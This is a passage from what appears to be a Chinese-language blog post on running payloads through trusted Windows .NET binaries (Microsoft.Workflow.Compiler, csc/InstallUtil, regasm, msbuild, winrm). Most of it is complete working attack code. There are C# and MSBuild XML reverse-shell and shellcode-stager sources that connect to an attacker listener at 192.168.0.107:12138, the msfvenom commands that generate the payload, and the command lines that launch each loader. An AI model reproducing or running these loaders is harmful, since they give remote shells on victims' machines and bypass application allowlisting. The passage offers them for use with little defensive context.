&lt;d2p1:localAssembly xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.Reflection&quot; i:nil=&quot;true&quot; /&gt;
&lt;d2p1:mtInfo i:nil=&quot;true&quot;/&gt;
&lt;d2p1:userCodeCCUs xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom&quot; i:nil=&quot;true&quot; /&gt;
&lt;/parameters&gt;
&lt;/CompilerInput&gt;
</code></pre>
<h5 id="1-tcp"><a href="#1-tcp" class="headerlink" title="1.tcp"></a>1.tcp</h5><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.ComponentModel;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Workflow.Activities; </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span> : <span class="title">SequentialWorkflowActivity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">static</span> StreamWriter streamWriter; </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Program</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">using</span>(TcpClient client = <span class="keyword">new</span> TcpClient(<span class="string">&quot;192.168.0.107&quot;</span>, <span class="number">12138</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">using</span>(Stream stream = client.GetStream())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">using</span>(StreamReader rdr = <span class="keyword">new</span> StreamReader(stream))</span><br><span class="line">&#123;</span><br><span class="line">streamWriter = <span class="keyword">new</span> StreamWriter(stream); </span><br><span class="line">StringBuilder strInput = <span class="keyword">new</span> StringBuilder(); </span><br><span class="line">Process p = <span class="keyword">new</span> Process();</span><br><span class="line">p.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">p.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">p.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">p.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">p.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">p.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">p.OutputDataReceived += <span class="keyword">new</span> DataReceivedEventHandler(CmdOutputDataHandler);</span><br><span class="line">p.Start();</span><br><span class="line">p.BeginOutputReadLine(); </span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">strInput.Append(rdr.ReadLine());</span><br><span class="line">p.StandardInput.WriteLine(strInput);</span><br><span class="line">strInput.Remove(<span class="number">0</span>, strInput.Length);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">CmdOutputDataHandler</span>(<span class="params"><span class="built_in">object</span> sendingProcess, DataReceivedEventArgs outLine</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">StringBuilder strOutput = <span class="keyword">new</span> StringBuilder(); </span><br><span class="line"><span class="keyword">if</span> (!String.IsNullOrEmpty(outLine.Data))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">strOutput.Append(outLine.Data);</span><br><span class="line">streamWriter.WriteLine(strOutput);</span><br><span class="line">streamWriter.Flush();</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception err) &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>&gt;msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f csharp
&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe 1.xml 1.cs
</code></pre>
<p><img src="130.png" alt="image"></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Workflow.Activities;</span><br><span class="line"><span class="keyword">using</span> System.Net; </span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">class</span> <span class="title">yrDaTlg</span> : <span class="title">SequentialWorkflowActivity</span> &#123;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAlloc</span>(<span class="params">UInt32 rCfMkmxRSAakg,UInt32 qjRsrljIMB, UInt32 peXiTuE, UInt32 AkpADfOOAVBZ</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">VirtualProtect</span>(<span class="params">IntPtr DStOGXQMMkP, <span class="built_in">uint</span> CzzIpcuQppQSTBJ, <span class="built_in">uint</span> JCFImGhkRqtwANx, <span class="keyword">out</span> <span class="built_in">uint</span> exgVpSg</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>]<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 eisuQbXKYbAvA, UInt32 WQATOZaFz, IntPtr AEGJQOn,IntPtr SYcfyeeSgPl, UInt32 ZSheqBwKtDf, <span class="keyword">ref</span> UInt32 SZtdSB</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr KqJNFlHpsKOV, UInt32 EYBOArlCLAM</span>)</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">yrDaTlg</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"><span class="built_in">byte</span>[] QWKpWKhcs =</span><br><span class="line">&#123;SHELLCODE</span><br><span class="line">&#125;;</span><br><span class="line">IntPtr AmnGaO = VirtualAlloc(<span class="number">0</span>, (UInt32)QWKpWKhcs.Length, <span class="number">0x3000</span>, <span class="number">0x04</span>);</span><br><span class="line">Marshal.Copy(QWKpWKhcs, <span class="number">0</span>, (IntPtr)(AmnGaO), QWKpWKhcs.Length);</span><br><span class="line">IntPtr oXmoNUYvivZlXj = IntPtr.Zero; UInt32 XVXTOi = <span class="number">0</span>; IntPtr pAeCTfwBS = IntPtr.Zero;</span><br><span class="line"><span class="built_in">uint</span> BnhanUiUJaetgy;</span><br><span class="line"><span class="built_in">bool</span> iSdNUQK = VirtualProtect(AmnGaO, (<span class="built_in">uint</span>)<span class="number">0x1000</span>, (<span class="built_in">uint</span>)<span class="number">0x20</span>, <span class="keyword">out</span> BnhanUiUJaetgy);</span><br><span class="line">oXmoNUYvivZlXj = CreateThread(<span class="number">0</span>, <span class="number">0</span>, AmnGaO, pAeCTfwBS, <span class="number">0</span>, <span class="keyword">ref</span> XVXTOi);</span><br><span class="line">WaitForSingleObject(oXmoNUYvivZlXj, <span class="number">0xFFFFFFFF</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="Csc"><a href="#Csc" class="headerlink" title="Csc"></a>Csc</h4><pre><code>&gt;msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f csharp
&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Ente rpriseServices.dll /r:System.IO.Compression.dll /target:library /out: C:\Users\y\Desktop\shell.exe /platform:x64 /unsafe C:\Users\y\Desktop\shell.cs
&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\y\Desktop\shell.exe
</code></pre>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Configuration.Install;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices; </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">[<span class="meta">System.ComponentModel.RunInstaller(true)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Sample</span> : <span class="title">System.Configuration.Install.Installer</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Uninstall</span>(<span class="params">System.Collections.IDictionary savedState</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Shellcode.Exec();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Shellcode</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">byte</span>[] shellcode = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">510</span>] &#123;</span><br><span class="line"> SHELLCODE</span><br><span class="line">&#125;;</span><br><span class="line">UInt32 funcAddr = VirtualAlloc(<span class="number">0</span>, (UInt32)shellcode .Length,</span><br><span class="line">MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">Marshal.Copy(shellcode , <span class="number">0</span>, (IntPtr)(funcAddr), shellcode .Length);</span><br><span class="line">IntPtr hThread = IntPtr.Zero;</span><br><span class="line">UInt32 threadId = <span class="number">0</span>;</span><br><span class="line">IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">hThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, funcAddr, pinfo, <span class="number">0</span>, <span class="keyword">ref</span> threadId);</span><br><span class="line">WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UInt32 MEM_COMMIT = <span class="number">0x1000</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">VirtualFree</span>(<span class="params">IntPtr lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">UInt32 dwSize, UInt32 dwFreeType</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">UInt32 lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">UInt32 dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">UInt32 lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">IntPtr param,</span></span></span><br><span class="line"><span class="function"><span class="params">UInt32 dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">ref</span> UInt32 lpThreadId</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">CloseHandle</span>(<span class="params">IntPtr handle</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">IntPtr hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">UInt32 dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetModuleHandle</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="built_in">string</span> moduleName</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">GetProcAddress</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">IntPtr hModule,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="built_in">string</span> procName</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">LoadLibrary</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="built_in">string</span> lpFileName</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">GetLastError</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="Regasm"><a href="#Regasm" class="headerlink" title="Regasm"></a>Regasm</h4><pre><code>&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out: C:\Users\y\Desktop\dll.dll  /unsafe C:\Users\y\Desktop\dll.cs
&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /u dll.dll
</code></pre>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">HYlDKsYF</span></span><br><span class="line"> &#123;</span><br><span class="line">	 <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">kxKhdVzWQXolmmF</span> : <span class="title">ServicedComponent</span> &#123;</span><br><span class="line">		 <span class="function"><span class="keyword">public</span> <span class="title">kxKhdVzWQXolmmF</span>(<span class="params"></span>)</span> &#123; Console.WriteLine(<span class="string">&quot;doge&quot;</span>); &#125;</span><br><span class="line">		 [<span class="meta">ComRegisterFunction</span>]</span><br><span class="line">		 <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">RegisterClass</span> (<span class="params"> <span class="built_in">string</span> pNNHrTZzW </span>)</span></span><br><span class="line"><span class="function"></span>		 &#123;</span><br><span class="line">			 ZApOAKJKY.QYJOTklTwn();</span><br><span class="line">			 &#125;</span><br><span class="line">			 [<span class="meta">ComUnregisterFunction</span>]</span><br><span class="line">			 <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">UnRegisterClass</span> (<span class="params"> <span class="built_in">string</span> pNNHrTZzW </span>)</span></span><br><span class="line"><span class="function"></span>			 &#123;</span><br><span class="line">				 ZApOAKJKY.QYJOTklTwn();</span><br><span class="line">				 &#125;</span><br><span class="line">				 &#125;</span><br><span class="line">				 <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ZApOAKJKY</span>  &#123; [DllImport(<span class="string">&quot;kernel32&quot;</span>)] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">HeapCreate</span>(<span class="params">UInt32 FJyyNB, UInt32 fwtsYaiizj, UInt32 dHJhaXQiaqW</span>)</span>;</span><br><span class="line">				 [<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">HeapAlloc</span>(<span class="params">UInt32 bqtaDNfVCzVox, UInt32 hjDFdZuT, UInt32 JAVAYBFdojxsgo</span>)</span>;</span><br><span class="line">				 [<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">RtlMoveMemory</span>(<span class="params">UInt32 AQdEyOhn, <span class="built_in">byte</span>[] wknmfaRmoElGo, UInt32 yRXPRezIkcorSOo</span>)</span>;</span><br><span class="line">				 [<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 uQgiOlrrBaR, UInt32 BxkWKqEKnp, UInt32 lelfRubuprxr, IntPtr qPzVKjdiF,UInt32 kNXJcS, <span class="keyword">ref</span> UInt32 atiLJcRPnhfyGvp</span>)</span>;</span><br><span class="line">				 [<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr XSjyzoKzGmuIOcD, UInt32 VumUGj</span>)</span>;<span class="function"><span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">HMSjEXjuIzkkmo</span>(<span class="params"><span class="built_in">string</span> aCWWUttzmy,<span class="built_in">int</span> iJGvqiEDGLhjr</span>)</span> &#123;</span><br><span class="line">					 IPEndPoint YUXVAnzAurxH = <span class="keyword">new</span> IPEndPoint(IPAddress.Parse(aCWWUttzmy),iJGvqiEDGLhjr);</span><br><span class="line">					 Socket MXCEuiuRIWgOYze = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">					 <span class="keyword">try</span> &#123; MXCEuiuRIWgOYze.Connect(YUXVAnzAurxH); &#125;</span><br><span class="line">					 catch &#123; <span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">					 <span class="built_in">byte</span>[] Bjpvhc = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">4</span>];</span><br><span class="line">					 MXCEuiuRIWgOYze.Receive(Bjpvhc,<span class="number">4</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">int</span> IETFBI = BitConverter.ToInt32(Bjpvhc,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">byte</span>[] ZKSAAFwxgSDnTW = <span class="keyword">new</span> <span class="built_in">byte</span>[IETFBI +<span class="number">5</span>];</span><br><span class="line"><span class="built_in">int</span> JFPJLlk =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(JFPJLlk &lt; IETFBI)</span><br><span class="line">&#123; JFPJLlk += MXCEuiuRIWgOYze.Receive(ZKSAAFwxgSDnTW, JFPJLlk +<span class="number">5</span>,(IETFBI - JFPJLlk)&lt;<span class="number">4096</span> ? (IETFBI - JFPJLlk) : <span class="number">4096</span>,<span class="number">0</span>);&#125;</span><br><span class="line"><span class="built_in">byte</span>[] nXRztzNVwPavq = BitConverter.GetBytes((<span class="built_in">int</span>)MXCEuiuRIWgOYze.Handle);</span><br><span class="line">Array.Copy(nXRztzNVwPavq,<span class="number">0</span>, ZKSAAFwxgSDnTW,<span class="number">1</span>,<span class="number">4</span>); ZKSAAFwxgSDnTW[<span class="number">0</span>]=<span class="number">0xBF</span>;</span><br><span class="line"><span class="keyword">return</span> ZKSAAFwxgSDnTW;&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">TOdKEwPYRUgJly</span>(<span class="params"><span class="built_in">byte</span>[] KNCtlJWAmlqJ</span>)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span>(KNCtlJWAmlqJ !=<span class="literal">null</span>) &#123;</span><br><span class="line">		UInt32 uuKxFZFwog = HeapCreate(<span class="number">0x00040000</span>,(UInt32)KNCtlJWAmlqJ.Length,<span class="number">0</span>);</span><br><span class="line">	UInt32 sDPjIMhJIOAlwn = HeapAlloc(uuKxFZFwog,<span class="number">0x00000008</span>,(UInt32)KNCtlJWAmlqJ.Length);</span><br><span class="line">	RtlMoveMemory(sDPjIMhJIOAlwn, KNCtlJWAmlqJ,(UInt32)KNCtlJWAmlqJ.Length);</span><br><span class="line">	UInt32 ijifOEfllRl =<span class="number">0</span>;</span><br><span class="line">	IntPtr ihXuoEirmz = CreateThread(<span class="number">0</span>,<span class="number">0</span>, sDPjIMhJIOAlwn, IntPtr.Zero,<span class="number">0</span>, <span class="keyword">ref</span> ijifOEfllRl);</span><br><span class="line">	WaitForSingleObject(ihXuoEirmz,<span class="number">0xFFFFFFFF</span>);&#125;&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">QYJOTklTwn</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">		<span class="built_in">byte</span>[] ZKSAAFwxgSDnTW =<span class="literal">null</span>; ZKSAAFwxgSDnTW = HMSjEXjuIzkkmo(<span class="string">&quot;192.168.0.107&quot;</span>,<span class="number">12138</span>);</span><br><span class="line">		TOdKEwPYRUgJly(ZKSAAFwxgSDnTW);</span><br><span class="line">		&#125; &#125; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="Msbuild"><a href="#Msbuild" class="headerlink" title="Msbuild"></a>Msbuild</h4><pre><code>https://gitee.com/RichChigga/msbuild-exec
MSF监听
&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 1.xml
</code></pre>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">ToolsVersion</span>=<span class="string">&quot;4.0&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Target</span> <span class="attr">Name</span>=<span class="string">&quot;iJEKHyTEjyCU&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xUokfh</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Target</span>&gt;</span></span><br><span class="line">&lt;UsingTask</span><br><span class="line">TaskName=&quot;xUokfh&quot;</span><br><span class="line">TaskFactory=&quot;CodeTaskFactory&quot;</span><br><span class="line">AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">Task</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Code</span> <span class="attr">Type</span>=<span class="string">&quot;Class&quot;</span> <span class="attr">Language</span>=<span class="string">&quot;cs&quot;</span>&gt;</span></span><br><span class="line">&lt;![CDATA[</span><br><span class="line">using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;</span><br><span class="line">using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;</span><br><span class="line">public class xUokfh : Task, ITask &#123;</span><br><span class="line">[DllImport(&quot;kernel32&quot;)] private static extern UInt32 VirtualAlloc(UInt32 ogephG,UInt32 fZZrvQ, UInt32 nDfrBaiPvDyeP, UInt32 LWITkrW);</span><br><span class="line">[DllImport(&quot;kernel32&quot;)]private static extern IntPtr CreateThread(UInt32 qEVoJxknom, UInt32 gZyJBJWYQsnXkWe, UInt32 jyIPELfKQYEVZM,IntPtr adztSLHGJiurGO, UInt32 vjSCprCJ, ref UInt32 KbPukprMQXUp);</span><br><span class="line">[DllImport(&quot;kernel32&quot;)] private static extern UInt32 WaitForSingleObject(IntPtr wVCIQGmqjONiM, UInt32 DFgVrE);</span><br><span class="line">static byte[] VYcZlUehuq(string IJBRrBqhigjGAx, int XBUCexXIrGIEpe) &#123;</span><br><span class="line">IPEndPoint DRHsPzS = new IPEndPoint(IPAddress.Parse(IJBRrBqhigjGAx),XBUCexXIrGIEpe);</span><br><span class="line">Socket zCoDOd = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">try &#123; zCoDOd.Connect(DRHsPzS); &#125;</span><br><span class="line">catch &#123; return null;&#125;</span><br><span class="line">byte[] OCrGofbbWRVsFEl = new byte[4];</span><br><span class="line">zCoDOd.Receive(OCrGofbbWRVsFEl, 4, 0);</span><br><span class="line">int auQJTjyxYw = BitConverter.ToInt32(OCrGofbbWRVsFEl, 0);</span><br><span class="line">byte[] MlhacMDOKUAfvMX = new byte[auQJTjyxYw + 5];</span><br><span class="line">int GFtbdD = 0;</span><br><span class="line">while (GFtbdD &lt; auQJTjyxYw)</span><br><span class="line">&#123; GFtbdD += zCoDOd.Receive(MlhacMDOKUAfvMX, GFtbdD + 5, (auQJTjyxYw -GFtbdD) &lt; 4096 ? (auQJTjyxYw - GFtbdD) : 4096, 0);&#125;</span><br><span class="line">byte[] YqBRpsmDUT = BitConverter.GetBytes((int)zCoDOd.Handle);</span><br><span class="line">Array.Copy(YqBRpsmDUT, 0, MlhacMDOKUAfvMX, 1, 4); MlhacMDOKUAfvMX[0]= 0xBF;</span><br><span class="line">return MlhacMDOKUAfvMX;&#125;</span><br><span class="line">static void NkoqFHncrcX(byte[] qLAvbAtan) &#123;</span><br><span class="line">if (qLAvbAtan != null) &#123;</span><br><span class="line">UInt32 jrYMBRkOAnqTqx = VirtualAlloc(0, (UInt32)qLAvbAtan.Length, 0x1000, 0x40);</span><br><span class="line">Marshal.Copy(qLAvbAtan, 0, (IntPtr)(jrYMBRkOAnqTqx),qLAvbAtan.Length);</span><br><span class="line">IntPtr WCUZoviZi = IntPtr.Zero;</span><br><span class="line">UInt32 JhtJOypMKo = 0;</span><br><span class="line">IntPtr UxebOmhhPw = IntPtr.Zero;</span><br><span class="line">WCUZoviZi = CreateThread(0, 0, jrYMBRkOAnqTqx, UxebOmhhPw, 0, ref JhtJOypMKo);</span><br><span class="line">WaitForSingleObject(WCUZoviZi, 0xFFFFFFFF); &#125;&#125;</span><br><span class="line">public override bool Execute()</span><br><span class="line">&#123;</span><br><span class="line">byte[] uABVbNXmhr = null; uABVbNXmhr = VYcZlUehuq(&quot;192.168.0.107&quot;,12138);</span><br><span class="line">NkoqFHncrcX(uABVbNXmhr);</span><br><span class="line">return true; &#125; &#125;</span><br><span class="line">]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">Code</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Task</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">UsingTask</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="Winrm"><a href="#Winrm" class="headerlink" title="Winrm"></a>Winrm</h4><pre><code>MSF监听
</code></pre>
<p><img src="131.png" alt="image"></p>
<pre><code>&gt;mkdir winrm
&gt;copy c:\Windows\System32\cscript.exe winrm
创建文件WsmPty.xsl复制payload进去
</code></pre>
